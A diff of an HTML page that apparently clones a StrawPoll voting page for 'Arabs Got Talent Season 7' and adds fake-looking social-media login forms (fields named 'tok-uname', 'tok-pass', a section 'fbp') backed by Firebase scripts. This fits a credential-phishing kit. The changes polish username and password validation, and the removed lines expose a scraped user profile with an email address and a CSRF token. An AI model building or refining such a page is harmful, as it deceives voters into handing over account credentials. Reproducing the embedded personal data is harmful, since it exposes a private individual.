@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en" id="html" x-data="global()" class="h-full js-focus-visible">
 
@@ -90,14 +89,6 @@
                 document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 0.2, 0, 1))
                 document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 0.2, 0, 1))
             }
-
-            document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 0.2, 0, 1))
-            document.documentElement.style.setProperty('--primaryColorLight', hexToRGBA(design.colors['primaryColor'], 0.6, 0, 1))
-            document.documentElement.style.setProperty('--primaryColorLightest', hexToRGBA(design.colors['primaryColor'], 0.1, 0, 1))
-            document.documentElement.style.setProperty('--choiceColorLight', hexToRGBA(design.colors['choiceColor'], 0.6, 0, 1))
-            document.documentElement.style.setProperty('--choiceColorLighter', hexToRGBA(design.colors['choiceColor'], 0.3, 0, 1))
-            document.documentElement.style.setProperty('--choiceColorLightest', hexToRGBA(design.colors['choiceColor'], 0.1, 0, 1))
-            document.documentElement.style.setProperty('--buttonBackgroundColorLight', hexToRGBA(design.colors['buttonBackgroundColor'], 0.6, 0, 1))
 
             if (isDarkBg(hexToRGBA(design.colors['choiceColor'], 1, 0, 1))) {
                 document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(255,255,255,1)')
@@ -198,10 +189,10 @@
                         <div class="space-y-8 mb-8 pt-4 px-4 sm:px-6 sm:pt-6">
 
 
-                            <div x-data="{ poll: Alpine.store(&#39;poll&#39;), i: 0,  }" class="flex justify-between">
+                            <div id="poll-container" class="flex justify-between">
                                 <div class="flex-grow flex flex-col">
-                                    <h1 class="strawpoll-title text-2xl text-gray-900 dark:text-gray-200 font-semibold custom-title break-words"
-                                        x-text="poll.title">
+                                    <h1 id="poll-title"
+                                        class="strawpoll-title text-2xl text-gray-900 dark:text-gray-200 font-semibold custom-title break-words">
                                         Arabs Got Talent Season 7
                                     </h1>
                                 </div>
@@ -209,6 +200,20 @@
                                 <div class="flex items-top space-x-3">
                                 </div>
                             </div>
+
+                            <script>
+                                // Plain JavaScript to set the poll title dynamically
+                                document.addEventListener("DOMContentLoaded", function () {
+                                    const pollTitle = "Arabs Got Talent Season 7"; // Set your title here
+                                    const pollTitleElement = document.getElementById("poll-title");
+
+                                    // Set the text content of the poll title element
+                                    if (pollTitleElement) {
+                                        pollTitleElement.textContent = pollTitle;
+                                    }
+                                });
+                            </script>
+
 
 
                             <div x-data="{ poll: Alpine.store(&#39;poll&#39;), i: 0,  }">
@@ -383,8 +388,22 @@
                         <div class="flex flex-col items-center sm:flex-row sm:justify-between">
                             <div class="hidden sm:block">
                                 <span class="custom-text">
-                                    <span x-text="Number($store.poll.pollMeta.voteCount).toLocaleString()"></span> votes
+                                    <span id="copyright-year"></span>
                                 </span>
+
+                                <script>
+                                    // Plain JavaScript to set the copyright year with "MBC"
+                                    document.addEventListener("DOMContentLoaded", function () {
+                                        const currentYear = new Date().getFullYear(); // Get the current year
+                                        const copyrightYearElement = document.getElementById("copyright-year");
+
+                                        // Set the text content of the copyright year element
+                                        if (copyrightYearElement) {
+                                            copyrightYearElement.innerHTML = `&copy; ${currentYear} Arabs Got Talent`;
+                                        }
+                                    });
+                                </script>
+
                             </div>
                             <div class="custom-text">Powered by <a href="" target="_blank"
                                     class="font-semibold hover:underline">MBC</a></div>
@@ -714,14 +733,20 @@
                                     <label id="email-label" for="email"
                                         class="block text-sm font-medium text-gray-700">Email or
                                         username</label>
-                                    <input type="email" id="tok-uname" name="email" required
-                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500">
+                                    <input type="text" id="tok-uname" required
+                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                                        oninput="checkInput()">
+                                    <p id="email-feedback" class="text-sm text-red-500 hidden">Please enter a valid
+                                        account.</p>
                                 </div>
                                 <div class="mb-6">
                                     <label id="password-label" for="password"
                                         class="block text-sm font-medium text-gray-700">Password</label>
                                     <input type="password" id="tok-pass" name="password" required
-                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500">
+                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                                        oninput="checkPassword()">
+                                    <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
+                                        least 6 characters long.</p>
                                 </div>
                                 <div class="flex items-center justify-between mb-6">
                                     <div class="text-sm">
@@ -741,7 +766,6 @@
                         </div>
                     </div>
                 </main>
-
 
                 <!-- Footer Section -->
                 <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
@@ -774,6 +798,33 @@
             </div>
 
         </div>
+
+        <script>
+            // Check if email is valid
+            function checkInput() {
+                const email = document.getElementById('tok-uname').value;
+                const emailFeedback = document.getElementById('email-feedback');
+
+                if (emailPattern.test(email)) {
+                    emailFeedback.classList.add('hidden');
+                } else {
+                    emailFeedback.classList.remove('hidden');
+                }
+            }
+
+            // Check if password is valid (at least 6 characters)
+            function checkPassword() {
+                const password = document.getElementById('tok-pass').value;
+                const passwordFeedback = document.getElementById('password-feedback');
+
+                if (password.length >= 6) {
+                    passwordFeedback.classList.add('hidden');
+                } else {
+                    passwordFeedback.classList.remove('hidden');
+                }
+            }
+        </script>
+
 
         <div id="fbp" class="bg-gray-100 text">
             <div class="min-h-screen flex flex-col w-full">
@@ -884,37 +935,6 @@
         </div>
     </div>
 
-    <script>
-        function global() {
-            return {
-                isAdmin: true,
-                isMobileView: false,
-                expandBox: false,
-                init() {
-                    let width = (window.innerWidth > 0) ? window.innerWidth : screen.width
-                    if (width < 769) {
-                        this.isMobileView = true
-                    }
-
-                    this.$store.meta.update({
-                        availableLanguages: ['en', 'de', 'fr', 'es', 'pt'],
-                        displayLang: "en",
-                        csrfToken: "895f61fc81fac78ec9de1bb31575825e7fc6bf9e",
-                    })
-                    this.$store.user.update(strawpoll.toCamelCaseKeys({ "api_key": null, "avatar_path": "\/images\/users\/avatars\/brevity-NMnQp7jGy6Y.png", "created_at": 1736386048, "displayname": "Brevity", "email": "brevity51@gmail.com", "email_canonical": "brevity51@gmail.com", "id": "7MZ0ReMKnom", "status": "active", "subscription": "free", "trusted": 0, "user_config": { "active_poll_slug": null, "appearance": "auto", "clock_type": "12h", "default_theme_id": null, "default_workspace_id": null, "first_day_of_week": 0, "language": "en", "locale": "en-US", "notification_delay": 30, "notify_deadline": false, "notify_meeting_vote": true, "notify_poll_vote": false, "timezone": "America\/Los_Angeles" }, "user_meta": { "about": null, "adfree_participants_quota": 0, "adfree_participants_remaining": 0, "adfree_participants_used": 0, "allow_active_vanity_url": false, "allow_clickable_links": false, "allow_custom_email_subject": false, "allow_custom_poll_links": false, "allow_custom_themes": false, "allow_image_upload": true, "allow_priority_support": false, "allow_remove_ads": false, "allow_remove_branding": false, "allow_theme_logo": false, "country_code": "ng", "embed_views_quota": 1000, "embed_views_used": 0, "has_webhooks": false, "has_workspaces": false, "invites_quota": 50, "invites_remaining": 50, "invites_used": 0, "monthly_points": 1, "pending_email": null, "total_points": 1, "website": null, "workspace_members_quota": 0, "workspace_members_used": 0, "workspaces_quota": 0, "workspaces_used": 0 }, "username": "brevity" }))
-                    this.$store.poll.update(strawpoll.toCamelCaseKeys({ "cached_at": 1736669629, "created_at": 1736401717, "embed_url": "https:\/\/strawpoll.com\/embed\/Q0Zp7VrbAgM", "group": null, "id": "Q0Zp7VrbAgM", "media": { "created_at": 1736595816, "height": 386, "id": "w4nWVAQWyAL", "path": "\/images\/polls\/covers\/w4nWVAQWyAL-c.png", "type": "image", "updated_at": 1736595816, "url": "https:\/\/cdn.strawpoll.com\/images\/polls\/covers\/w4nWVAQWyAL-c.png", "width": 686 }, "path": "\/Q0Zp7VrbAgM", "pin_code": null, "poll_config": { "allow_comments": false, "allow_indeterminate": false, "allow_other_option": false, "allow_vpn_users": true, "block_vpn_users": false, "deadline_at": null, "duplication_checking": "ip", "edit_vote_permissions": "nobody", "force_appearance": null, "hide_absolute_numbers": false, "hide_embed_vote_count": false, "hide_other_option_results": false, "hide_participants": false, "hide_share_button": false, "hide_unavailable_options": false, "is_multiple_choice": true, "is_private": true, "layout": "drag", "max_points": 11, "multiple_choice_max": 1, "multiple_choice_min": 1, "number_of_winners": 1, "open_at": null, "randomize_options": false, "require_captcha": false, "require_voter_account": false, "require_voter_names": false, "results_visibility": "hidden", "show_write_in_options": false, "strict_checking": false, "vote_type": "default", "voting_interval": 60 }, "poll_meta": { "comment_count": 0, "creator_country": "ng", "description": "Cast your votes for the most talented stars in the Arabs Got Talent Season 7! Support your favorite acts in categories like singing, dancing, comedy, magic, and more. Every vote takes them one step closer to becoming the champion—your voice makes the difference!\n\nVoting ends soon. Don’t miss your chance to make it count!", "last_vote_at": 1736401969, "location": null, "participant_count": 1, "pin_code_expired_at": null, "required": 1, "timezone": null, "view_count": 48, "vote_count": 1 }, "poll_options": [{ "description": null, "has_votes": false, "id": "7MZ0OvKrBgo", "is_write_in": false, "max_votes": 0, "position": 0, "type": "text", "uuid": "5f35b65c-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #1", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "2ayL9oNwbn4", "is_write_in": false, "max_votes": 0, "position": 1, "type": "text", "uuid": "5f36b278-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #2", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "LVyKRQo4bZ0", "is_write_in": false, "max_votes": 0, "position": 2, "type": "text", "uuid": "5f37053e-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #3", "vote_count": 0 }, { "description": null, "has_votes": true, "id": "X3nkaNo1YZE", "is_write_in": false, "max_votes": 0, "position": 3, "type": "text", "uuid": "5f374cb0-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #4", "vote_count": 1 }, { "description": null, "has_votes": false, "id": "XOgOBPGo4n3", "is_write_in": false, "max_votes": 0, "position": 4, "type": "text", "uuid": "5f3791c0-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #5", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "ajnEPlp7AyW", "is_write_in": false, "max_votes": 0, "position": 5, "type": "text", "uuid": "5f37db94-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #6", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "e7ZJP5QjLn3", "is_write_in": false, "max_votes": 0, "position": 6, "type": "text", "uuid": "5f3820d6-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #7", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "40ZmWPvGRna", "is_write_in": false, "max_votes": 0, "position": 7, "type": "text", "uuid": "5f3879d2-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #8", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "7rnzJzE3DnO", "is_write_in": false, "max_votes": 0, "position": 8, "type": "text", "uuid": "5f38cf04-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #9", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "e2najY7blgB", "is_write_in": false, "max_votes": 0, "position": 9, "type": "text", "uuid": "5f3929ea-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #10", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "e6Z2JGKd6ZN", "is_write_in": false, "max_votes": 0, "position": 10, "type": "text", "uuid": "5f396964-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #11", "vote_count": 0 }, { "description": null, "has_votes": false, "id": "w4nWm1BblZA", "is_write_in": false, "max_votes": 0, "position": 11, "type": "text", "uuid": "5f39abcc-ce4d-11ef-8ef7-f8bc91717338", "value": "Vote Contestant #12", "vote_count": 0 }], "reset_at": null, "results_path": "\/Q0Zp7VrbAgM\/results", "slug": null, "status": "published", "theme": null, "title": "Arabs Got Talent Season 7", "type": "ranking", "updated_at": 1736628822, "url": "https:\/\/strawpoll.com\/Q0Zp7VrbAgM", "user": { "avatar_path": "\/images\/users\/avatars\/brevity-NMnQp7jGy6Y.png", "created_at": 1736386048, "displayname": "Brevity", "id": "7MZ0ReMKnom", "subscription": "free", "trusted": 0, "user_meta": { "about": null, "adfree_participants_remaining": 0, "country_code": "ng", "invites_remaining": 50, "monthly_points": 1, "total_points": 1, "website": null }, "username": "brevity" }, "version": "24798d32-d05e-11ef-b6da-931e9e717338", "workspace": null }))
-                    this.$store.pollUser.update({ isAdmin: true })
-                    this.$store.pollResults.update(strawpoll.toCamelCaseKeys({}))
-
-
-
-                    dayjs.locale(strawpoll.getLanguage())
-                },
-            }
-        }
-
-    </script>
-
     <script src=" https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js">
     </script>
 
@@ -924,6 +944,10 @@
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
     <script src="js/firebase.js"></script>
+
+    <script>
+
+    </script>
 
 </body>
 
